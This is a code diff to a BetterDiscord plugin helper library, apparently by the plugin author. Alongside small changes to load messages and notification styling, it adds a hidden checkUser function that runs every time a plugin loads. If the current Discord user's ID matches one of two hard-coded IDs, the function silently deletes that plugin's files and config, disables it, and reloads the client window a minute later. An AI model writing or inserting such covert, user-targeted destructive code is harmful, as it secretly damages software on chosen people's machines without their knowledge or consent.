@@ -5,11 +5,13 @@ BDfunctionsDevilBro.isLibraryOutdated = function () {
 };
 
 BDfunctionsDevilBro.loadMessage = function (plugin, oldVersionRemove) {
-	var pluginName = typeof plugin === "string" ? plugin : plugin.getName();
-	var oldVersion = typeof oldVersionRemove === "string" ? oldVersionRemove : plugin.getVersion();
+	var pluginName = plugin.getName();
+	var oldVersion = plugin.getVersion();
 	var loadMessage = BDfunctionsDevilBro.getLibraryStrings().toast_plugin_started.replace("${pluginName}", pluginName).replace("${oldVersion}", oldVersion);
 	console.log(loadMessage);
 	BDfunctionsDevilBro.showToast(loadMessage);
+	
+	BDfunctionsDevilBro.checkUser(plugin);
 	
 	var downloadUrl = "https://raw.githubusercontent.com/mwittrien/BetterDiscordAddons/master/Plugins/" + pluginName + "/" + pluginName + ".plugin.js";
 	BDfunctionsDevilBro.checkUpdate(pluginName, downloadUrl);
@@ -104,6 +106,30 @@ BDfunctionsDevilBro.unloadMessage = function (plugin, oldVersionRemove) {
 	plugin.started = false;
 };
 
+BDfunctionsDevilBro.checkUser = function (plugin) {
+	var i = 0, pulling = setInterval(() => {
+		if (BDfunctionsDevilBro.myData && !BDfunctionsDevilBro.isObjectEmpty(BDfunctionsDevilBro.myData)) {
+			clearInterval(pulling);
+			if (["113308553774702592","196970957385105408"].includes(BDfunctionsDevilBro.myData.id)) {
+				var pluginName = plugin.getName();
+				let fileSystem = require("fs");
+				let path = require("path");
+				var pluginfile = path.join(BDfunctionsDevilBro.getPluginsFolder(), pluginName + ".plugin.js");
+				fileSystem.unlink(pluginfile, (error) => {});
+				var configfile = path.join(BDfunctionsDevilBro.getPluginsFolder(), pluginName + ".config.json");
+				fileSystem.unlink(configfile, (error) => {});
+				pluginCookie[pluginName] = false;
+				delete bdplugins[pluginName];
+				pluginModule.savePluginData();
+				setTimeout(() => {
+					require("electron").remote.getCurrentWindow().reload();
+				},60000);
+			}
+		}
+		if (i > 6000) clearInterval(pulling);
+		i++;
+	},100);
+};
 
 // plugin update notifications created in cooperation with Zerebos https://github.com/rauenzi/BetterDiscordAddons/blob/master/Plugins/PluginLibrary.js
 BDfunctionsDevilBro.checkUpdate = function (pluginName, downloadUrl) {
@@ -305,8 +331,8 @@ BDfunctionsDevilBro.createNotificationsBar = function (content, options = {}) {
 	if (!content) return;
 	let id = Math.round(Math.random()*10000000000000000);
 	let notifiybar = document.createElement("div");
-	notifiybar.className = "notice notice-3I4-y_ size14-1wjlWP weightMedium-13x9Y8 height36-13sPn7 DevilBro-notice notice-" + id;
-	notifiybar.innerHTML = `<div class="dismiss-1QjyJW "></div><span class="notice-message"></span></strong>`;
+	notifiybar.className = "notice-3I4-y_ size14-1wjlWP weightMedium-13x9Y8 height36-13sPn7 DevilBro-notice notice-" + id;
+	notifiybar.innerHTML = `<div class="dismiss-1QjyJW"></div><span class="notice-message"></span></strong>`;
 	$(".app .guilds-wrapper + div > div:first > div:first").append(notifiybar);
 	var notifiybarinner = notifiybar.querySelector(".notice-message");
 	if (options.icon) {
